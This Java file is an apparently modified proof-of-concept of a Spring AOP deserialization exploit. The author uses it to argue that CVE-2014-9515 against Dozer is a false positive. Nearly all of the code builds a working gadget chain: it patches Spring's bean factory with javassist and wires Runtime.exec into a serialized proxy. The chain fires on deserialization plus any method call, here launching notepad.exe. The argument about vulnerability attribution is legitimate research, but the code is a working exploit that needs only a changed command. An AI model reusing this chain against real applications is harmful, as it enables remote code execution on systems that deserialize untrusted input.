package com.javapentesting;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Collections;

import org.dozer.DozerBeanMapper;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.DefaultAopProxyFactory;
import org.springframework.aop.target.SimpleBeanTargetSource;
import org.springframework.beans.factory.config.BeanDefinition;
import org.springframework.beans.factory.config.MethodInvokingFactoryBean;
import org.springframework.beans.factory.support.AbstractBeanDefinition;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.beans.factory.support.GenericBeanDefinition;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.SerialVersionUID;

/**
 * This showcase is a modification of a security exploit, claiming dozer to be vulnerable against RME. This modification
 * shows that this vulnerability accusation is wrong. This vulnerability is filed at
 * https://nvd.nist.gov/vuln/detail/CVE-2014-9515 (hope to change that).
 *
 * This modification shows that the cleverly crafted malicious object would be triggered by any first user of that
 * object. But not dozer beanmapper. Hence: dozer-beanmapper is not at all to blame.
 *
 * I am hoping to help the dozer community to relief from the vulnerability finding. *
 *
 * Modifications of this code example are: some more comments changed file path to make it working for windows
 * development env called a different programm that shall act as a malicious programm (notepad.exe instead of evince) !!
 * malicous deserialized bean no longer called by dozer but by a conventional call of regular getter
 *
 * @author Marco Rose, original modified source:
 *         https://github.com/pentestingforfunandprofit/research/tree/master/dozer-rce
 */
public class App {
  public static void main(String[] args) {

    // for linux -> linux style file-location
    // DozerBeanMapper mapper = new DozerBeanMapper(Arrays.asList(new String[] { "file:/tmp/dozerBeanMapping.xml" }));

    // for windows -> windows style file-location
    DozerBeanMapper mapper = new DozerBeanMapper(
        Arrays.asList(new String[] { "file:C://transfer/dozerBeanMapping.xml" }));

    // The code below is largely copy-paste from pwntester's CVE-2011-2894 exploit:
    // https://github.com/pwntester/SpringBreaker
    System.out.println("[+] Getting a DefaultListableBeanFactory modified so it has no writeReplace() method");
    Object instrumentedFactory = null;
    ClassPool pool = ClassPool.getDefault();
    try {
      pool.appendClassPath(new javassist.LoaderClassPath(BeanDefinition.class.getClassLoader()));
      CtClass instrumentedClass = pool.get("org.springframework.beans.factory.support.DefaultListableBeanFactory");
      SerialVersionUID.setSerialVersionUID(instrumentedClass);
      CtMethod method = instrumentedClass.getDeclaredMethod("writeReplace");
      method.setName("writeReplaceDisabled");
      Class instrumentedFactoryClass = instrumentedClass.toClass();
      instrumentedFactory = instrumentedFactoryClass.newInstance();
    } catch (Exception e) {
      e.printStackTrace();
    }
    DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) instrumentedFactory;
    // Create malicious bean definition programatically
    System.out.println("[+] Creating malicious bean definition programatically");
    // First we will set up a bean created with a factory method (instead of using the constructor) that will return a
    // java.lang.Runtime
    // Runtime or ProcessBuilder are not serializable so we cannot use them for the MethodInvokingFactory targetObject,
    // but we can use a bean definition instead that wraps
    // these objects as the server will instantiate them
    GenericBeanDefinition runtime = new GenericBeanDefinition();
    runtime.setBeanClass(Runtime.class);
    runtime.setFactoryMethodName("getRuntime"); // Factory Method needs to be static
    // Exploit bean to be registered in the bean factory as the target source
    GenericBeanDefinition payload = new GenericBeanDefinition();
    // use MethodInvokingFactoryBean instead of factorymethod because we need to pass arguments,
    // and can't do that with the unserializable ConstructorArgumentValues
    payload.setBeanClass(MethodInvokingFactoryBean.class);
    payload.setScope("prototype");
    payload.getPropertyValues().add("targetObject", runtime);
    payload.getPropertyValues().add("targetMethod", "exec");
    payload.getPropertyValues().add("arguments", Collections.singletonList("notepad.exe"));
    beanFactory.registerBeanDefinition("exploit", payload);
    // Preparing BeanFactory to be serialized
    System.out.println("[+] Preparing BeanFactory to be serialized");
    System.out.println("[+] Nullifying non-serializable members");
    try {
      Field constructorArgumentValues = AbstractBeanDefinition.class.getDeclaredField("constructorArgumentValues");
      constructorArgumentValues.setAccessible(true);
      constructorArgumentValues.set(payload, null);
      System.out.println("[+] payload BeanDefinition constructorArgumentValues property should be null: "
          + payload.getConstructorArgumentValues());
      Field methodOverrides = AbstractBeanDefinition.class.getDeclaredField("methodOverrides");
      methodOverrides.setAccessible(true);
      methodOverrides.set(payload, null);
      System.out.println(
          "[+] payload BeanDefinition methodOverrides property should be null: " + payload.getMethodOverrides());
      Field constructorArgumentValues2 = AbstractBeanDefinition.class.getDeclaredField("constructorArgumentValues");
      constructorArgumentValues2.setAccessible(true);
      constructorArgumentValues2.set(runtime, null);
      System.out.println("[+] runtime BeanDefinition constructorArgumentValues property should be null: "
          + runtime.getConstructorArgumentValues());
      Field methodOverrides2 = AbstractBeanDefinition.class.getDeclaredField("methodOverrides");
      methodOverrides2.setAccessible(true);
      methodOverrides2.set(runtime, null);
      System.out.println(
          "[+] runtime BeanDefinition methodOverrides property should be null: " + runtime.getMethodOverrides());
      Field autowireCandidateResolver = DefaultListableBeanFactory.class.getDeclaredField("autowireCandidateResolver");
      autowireCandidateResolver.setAccessible(true);
      autowireCandidateResolver.set(beanFactory, null);
      System.out.println("[+] BeanFactory autowireCandidateResolver property should be null: "
          + beanFactory.getAutowireCandidateResolver());
    } catch (Exception i) {
      i.printStackTrace();
      System.exit(-1);
    }
    // AbstractBeanFactoryBasedTargetSource
    System.out.println(
        "[+] Creating a TargetSource for our handler, all hooked calls will be delivered to our malicious bean provided by our factory");
    SimpleBeanTargetSource targetSource = new SimpleBeanTargetSource();
    targetSource.setTargetBeanName("exploit");
    targetSource.setBeanFactory(beanFactory);
    // JdkDynamicAopProxy (invocationhandler)
    System.out
        .println("[+] Creating the handler and configuring the target source pointing to our malicious bean factory");
    AdvisedSupport config = new AdvisedSupport();
    config.addInterface(Corgi.class); // So that the factory returns a JDK dynamic proxy
    config.setTargetSource(targetSource);
    DefaultAopProxyFactory handlerFactory = new DefaultAopProxyFactory();
    InvocationHandler handler = (InvocationHandler) handlerFactory.createAopProxy(config);
    // Proxy
    System.out.println(
        "[+] Creating a Proxy implementing the server side expected interface (Corgi) with our malicious handler");
    Corgi proxy = (Corgi) Proxy.newProxyInstance(Corgi.class.getClassLoader(), new Class<?>[] { Corgi.class }, handler);
    // Now let's serialize the proxy
    System.out.println("[+] Serializating malicious proxy");
    try {
      FileOutputStream fileOut = new FileOutputStream("proxy.ser");
      ObjectOutputStream outStream = new ObjectOutputStream(fileOut);
      outStream.writeObject(proxy);
      outStream.close();
      fileOut.close();
    } catch (IOException i) {
      i.printStackTrace();
    }
    System.out.println("[+] Successfully serialized: " + proxy.getClass().getName());

    // Now deserialize the proxy object, and use dozer to map the Corgi to a Dachshund

    Corgi c = null;

    try {
      FileInputStream fileIn = new FileInputStream("proxy.ser");
      ObjectInputStream in = new ObjectInputStream(fileIn);
      c = (Corgi) in.readObject();
      in.close();
      fileIn.close();
    } catch (IOException i) {
      i.printStackTrace();
      return;
    } catch (ClassNotFoundException cnfe) {
      System.out.println("Employee class not found");
      cnfe.printStackTrace();
      return;
    }
    // After deserialization notepad will pop by first usage

    // dozer (if the first user of malicious object c) actually triggers the malicious code
    // Dachshund longDog = mapper.map(c, Dachshund.class);

    // but you don't need dozer at all to achieve that - any call to c will launch the malicious code
    c.getWidth(); // notepad to come up.

    // THUS: dozer-mapper is not to blame - CVE-2014-9515 is a clear FALSE POSITIVE!
  }
}
